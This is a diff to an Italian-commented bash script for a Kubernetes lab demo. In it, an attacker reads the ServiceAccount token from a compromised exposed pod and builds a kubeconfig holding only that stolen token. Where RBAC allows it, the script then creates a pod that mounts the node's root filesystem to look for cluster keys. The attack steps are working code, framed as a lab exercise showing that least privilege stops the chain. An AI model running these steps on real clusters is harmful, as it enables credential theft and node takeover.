@@ -3,14 +3,19 @@
 # Attacco dimostrativo A1 - Dal perimetro al token del ServiceAccount
 #                           (movimento laterale verso il controllo del cluster)
 #
-# MODELLO DI ATTACCANTE (vedi security-demos/modello-attaccante-04-06.md)
+# MODELLO DI ATTACCANTE (vedi security-demos/README.md)
 #   - OUTSIDER: nessuna credenziale Kubernetes, nessun accesso al cluster.
-#     Parte dalla rete e dalle sole superfici esposte (il bridge PMU / openPDC
-#     e' il pod piu' esposto; riceve dati di misura dall'esterno).
+#     Parte dalla rete e dalla sola superficie esposta: il reverse proxy
+#     'webproxy', unico pod raggiungibile dall'esterno (via l'Ingress). Dietro
+#     di esso la prima superficie pre-login e' l'autenticazione (Keycloak/OAuth2).
 #   - ZERO-KNOWLEDGE: non sa se le misconfigurazioni ci sono. Le SCOPRE
 #     sondando e osservando le risposte. Non assume nulla.
 #   - PRIVILEGI MINIMI: a ogni passo usa SOLO cio' che ha verificato di avere.
 #     Non si auto-concede ruoli, non crea RoleBinding, non usa credenziali admin.
+#     RIGORE: i passi 3-4 agiscono con un kubeconfig ISOLATO la cui UNICA
+#     credenziale e' il token rubato (nessun client-cert, nessun fallback al
+#     kubeconfig admin dell'operatore). Cosi' l'esperimento ha un controllo
+#     valido: senza Excessive RBAC la catena si FERMA davvero al passo 4.
 #
 # UNICA ASSUNZIONE dichiarata: l'attaccante ha ottenuto esecuzione di codice
 # DENTRO il pod esposto, tramite una vulnerabilita' applicativa. Il "come" e'
@@ -48,11 +53,46 @@ VULN_ROLE="lab-excessive-rbac-createpods"       # modella una misconfig "Excessi
 VULN_BIND="lab-excessive-rbac-createpods-binding"
 BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"
 TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
+ATK_KUBECONFIG=""                               # kubeconfig isolato col solo token rubato
 
 line() { printf '\n=== %s\n' "$1"; }
 stop() { printf '\n>>> CATENA FERMATA (%s): %s\n' "$1" "$2"; }
 need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
 b64pad() { local s="$1"; while [ $(( ${#s} % 4 )) -ne 0 ]; do s="${s}="; done; printf '%s' "$s"; }
+
+# Costruisce un kubeconfig che autentica SOLO col token rubato (parametro $1).
+# Endpoint e CA sono quelli del cluster: dentro al pod l'attaccante li ha gia' nel
+# mount del SA; qui li rileggiamo dal kubeconfig esistente in sola lettura, ma la
+# sola CREDENZIALE scritta e' il token -> impossibile ripiegare sull'identita' admin.
+build_attacker_kubeconfig() {
+  local tok="$1" server ca_data ca_file
+  server="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || true)"
+  ca_data="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' 2>/dev/null || true)"
+  if [ -z "$ca_data" ]; then
+    ca_file="$(kubectl config view --raw --minify -o jsonpath='{.clusters[0].cluster.certificate-authority}' 2>/dev/null || true)"
+    [ -n "$ca_file" ] && [ -f "$ca_file" ] && ca_data="$(base64 "$ca_file" 2>/dev/null | tr -d '\n')"
+  fi
+  ATK_KUBECONFIG="$(mktemp)"
+  {
+    echo "apiVersion: v1"
+    echo "kind: Config"
+    echo "clusters:"
+    echo "- name: lab"
+    echo "  cluster:"
+    echo "    server: ${server:-https://kubernetes.default.svc}"
+    if [ -n "$ca_data" ]; then echo "    certificate-authority-data: $ca_data"
+    else                       echo "    insecure-skip-tls-verify: true"; fi
+    echo "contexts:"
+    echo "- name: stolen"
+    echo "  context: { cluster: lab, user: stolen-sa }"
+    echo "current-context: stolen"
+    echo "users:"
+    echo "- name: stolen-sa"
+    echo "  user:"
+    echo "    token: ${tok}"
+  } > "$ATK_KUBECONFIG"
+}
+
 need kubectl
 kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }
 
@@ -60,6 +100,7 @@ kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1;
 cleanup() {
   set +e
   kubectl delete pod "$ATK_POD" -n "$NS" --ignore-not-found --grace-period=0 >/dev/null 2>&1
+  [ -n "$ATK_KUBECONFIG" ] && rm -f "$ATK_KUBECONFIG" >/dev/null 2>&1
   if [ "$SIMULA_RBAC_ECCESSIVO" = "1" ]; then
     kubectl delete rolebinding "$VULN_BIND" -n "$NS" --ignore-not-found >/dev/null 2>&1
     kubectl delete role "$VULN_ROLE" -n "$NS" --ignore-not-found >/dev/null 2>&1
@@ -90,13 +131,15 @@ echo "INGRESSO (stage 0): l'outsider ottiene il foothold sfruttando una vulnerab
 echo "applicativa sul servizio esposto (MITRE T1190 'Exploit Public-Facing Application')."
 echo "In laboratorio questo stage e' RAPPRESENTATO con 'kubectl exec' nel pod esposto; la"
 echo "classe di vulnerabilita', il CVE di riferimento (Log4Shell, CVE-2021-44228) e i passi"
-echo "di riproduzione sono descritti in security-demos/04-ingresso-vulnerabilita.md."
+echo "di riproduzione sono descritti in security-demos/README.md."
 
 # -----------------------------------------------------------------------------
 # 0. Foothold: il pod esposto da cui l'attaccante esegue codice
 # -----------------------------------------------------------------------------
-POD="$(kubectl get pods -n "$NS" -l smartgrid.io/role=openpdc -o name 2>/dev/null | head -n1)"
-[ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -l smartgrid.io/role=pmu-bridge -o name 2>/dev/null | head -n1)"
+# Il webproxy (reverse proxy) e' l'unico pod esposto all'esterno (via Ingress):
+# e' il foothold realistico per un outsider. Fallback: openPDC, poi primo pod.
+POD="$(kubectl get pods -n "$NS" -l app=webproxy -o name 2>/dev/null | head -n1)"
+[ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -l smartgrid.io/role=openpdc -o name 2>/dev/null | head -n1)"
 [ -n "$POD" ] || POD="$(kubectl get pods -n "$NS" -o name | head -n1)"
 [ -n "$POD" ] || { echo "nessun pod nel namespace '$NS'"; exit 1; }
 POD="${POD#pod/}"
@@ -132,6 +175,9 @@ PAYLOAD="$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')"
 b64pad "$PAYLOAD" | base64 -d 2>/dev/null | tr ',' '\n' \
   | grep -E '"sub"|"namespace"|"serviceaccount"' || echo "   (payload non decodificabile qui; non e' importante)"
 
+# da qui in poi l'attaccante agisce con un kubeconfig che usa SOLO questo token
+build_attacker_kubeconfig "$TOKEN"
+
 echo "-- l'API server e' raggiungibile DAL POD? (egress non filtrato = misconfig abilitante)"
 API_CODE="$(kubectl exec -n "$NS" "$POD" -- sh -c '
   T=$(cat '"$TOKEN_PATH"' 2>/dev/null)
@@ -155,8 +201,8 @@ esac
 #    Niente auto-concessione di ruoli: cio' che non c'e', non lo prende.
 # -----------------------------------------------------------------------------
 line "3. Permessi REALI dell'identita' rubata (RBAC effettivo, nessun over-grant preso)"
-echo "-- cosa puo' fare, oggi, questo token (usato come credenziale, non admin):"
-kubectl --token="$TOKEN" auth can-i --list -n "$NS" 2>/dev/null | head -n 15 || \
+echo "-- cosa puo' fare, oggi, questo token (kubeconfig isolato, solo-token):"
+kubectl --kubeconfig "$ATK_KUBECONFIG" auth can-i --list -n "$NS" 2>/dev/null | head -n 15 || \
   echo "   (enumerazione non disponibile da qui)"
 
 # -----------------------------------------------------------------------------
@@ -165,15 +211,15 @@ kubectl --token="$TOKEN" auth can-i --list -n "$NS" 2>/dev/null | head -n 15 || 
 #    la catena si ferma -- ed e' la prova che il minimo privilegio regge.
 # -----------------------------------------------------------------------------
 line "4. Prova (col solo token) a creare un pod che monti il filesystem del nodo (T1610)"
-if ! kubectl --token="$TOKEN" auth can-i create pods -n "$NS" >/dev/null 2>&1; then
+if ! kubectl --kubeconfig "$ATK_KUBECONFIG" auth can-i create pods -n "$NS" >/dev/null 2>&1; then
   stop "passo 4" "l'identita' rubata NON puo' creare pod (RBAC a minimo privilegio)."
   echo "    Senza 'create pods' la catena verso il nodo e il control plane non prosegue."
   echo "    (Per vedere il seguito su un cluster vulnerabile: SIMULA_RBAC_ECCESSIVO=1.)"
   echo; echo "RISULTATO: catena fermata al passo 4 (nessun Excessive RBAC)."
 else
   echo "   => l'identita' PUO' creare pod: condizione 'Excessive RBAC' presente. Proseguo."
-  echo "-- creo (col solo token) un pod che monta hostPath / in sola lettura:"
-  kubectl --token="$TOKEN" apply -f - <<EOF >/dev/null
+  echo "-- creo (col solo token rubato) un pod che monta hostPath / in sola lettura:"
+  kubectl --kubeconfig "$ATK_KUBECONFIG" apply -f - <<EOF >/dev/null
 apiVersion: v1
 kind: Pod
 metadata:
@@ -195,7 +241,9 @@ EOF
   kubectl wait pod "$ATK_POD" -n "$NS" --for=condition=Ready --timeout=90s >/dev/null 2>&1 || true
   NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
   echo "   pod schedulato sul nodo: ${NODE:-?}"
-  echo "-- PROVA D'IMPATTO (solo 'ls'/conteggi, nessuna chiave stampata):"
+  echo "-- OSSERVAZIONE DI LABORATORIO dell'impatto (solo 'ls'/conteggi, nessuna chiave"
+  echo "   stampata). L'AZIONE D'ATTACCO sotto esame e' la creazione del pod col token;"
+  echo "   qui il laboratorio ispeziona cosa quel pod monta dal nodo:"
   kubectl exec -n "$NS" "$ATK_POD" -- sh -c '
     found=0
     for d in /host/etc/kubernetes/pki /host/var/lib/minikube/certs; do
@@ -217,4 +265,4 @@ echo
 echo "RIEPILOGO: l'attaccante outsider arriva solo fin dove la configurazione reale"
 echo "glielo consente. Ogni anello e' una misconfig: token automontato (1), egress"
 echo "aperto, Excessive RBAC, pod sul control plane (2). Togline uno spezza la catena."
-echo "Contromisure complete: README e security-demos/mitigazioni.md, sez. 1."
+echo "Contromisure complete: README e security-demos/README.md, sez. 1."
